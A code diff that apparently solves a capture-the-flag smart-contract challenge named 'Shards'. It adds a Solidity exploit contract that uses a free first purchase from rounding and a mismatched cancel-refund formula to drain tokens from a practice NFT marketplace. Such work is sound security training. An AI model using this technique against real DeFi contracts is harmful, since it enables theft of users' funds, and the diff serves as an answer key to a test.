@@ -114,7 +114,7 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        new ShardsExploit(marketplace, token, recovery);
     }
 
     /**
@@ -134,5 +134,44 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+/**
+ * @notice Exploit deployed by `player` in a single transaction.
+ *
+ * Root cause: in `ShardsNFTMarketplace`, the `fill` payment uses
+ *     pay = want * (price * rate / 1e6) / totalShards
+ * while `cancel` refund uses
+ *     refund = shards * rate / 1e6
+ * The `cancel` formula is missing the `price / totalShards` factor,
+ * so refund/pay ratio = totalShards / price = 1e25 / 1e12 = 1e13.
+ *
+ * Also, with price=1e12, rate=75e15, totalShards=1e25, a `fill` of
+ * want <= 133 rounds the payment down to 0 (mulDivDown), so the
+ * first purchase is free — which bootstraps the attack from zero DVT.
+ */
+contract ShardsExploit {
+    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
+        // Step 1: free purchase of 133 shards (pay rounds to 0)
+        uint256 idx0 = marketplace.fill(1, 133);
+        // Step 2: immediately cancel; refund = 133 * 75e15 / 1e6 ≈ 9.975e12 wei
+        marketplace.cancel(1, uint256(idx0));
+
+        // Step 3: approve so the second fill's transferFrom succeeds
+        token.approve(address(marketplace), type(uint256).max);
+
+        // Step 4: second fill with want just under 1e10.
+        //   At want=1e10 the refund would exactly equal the initial 75e19 wei of fees,
+        //   but cancel #1 already pulled ~9.975e12 wei, so we subtract a buffer to avoid
+        //   overdrawing the marketplace (which would revert the ERC20 transfer).
+        //     pay    ≈ want * 75 / 1e4  (we have ~1e13 wei from cancel #1)
+        //     refund ≈ want * 75e9       (paid to us in DVT)
+        uint256 want2 = 1e10 - 1e6;
+        uint256 idx1 = marketplace.fill(1, want2);
+        marketplace.cancel(1, uint256(idx1));
+
+        // Step 5: forward everything we drained to the recovery account
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
